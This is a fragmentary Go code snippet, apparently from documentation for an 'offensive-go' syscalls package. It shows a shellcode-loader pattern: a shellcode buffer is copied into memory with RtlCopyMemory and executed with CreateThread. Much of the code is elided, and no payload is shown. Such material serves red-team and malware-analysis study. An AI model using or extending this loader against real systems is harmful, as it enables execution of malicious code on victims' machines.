...
import (
	...
	"github.com/synzack/offensive-go/offsecsyscalls"
...
func main() {
	...
	//RtlCopyMemory
	rtlCopyMemErr := offsecsyscalls.RtlCopyMemory(memAddr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	...
	thread, createThreadErr := offsecsyscalls.CreateThread(nil, 0, memAddr, uintptr(0), 0, &lpThreadID)
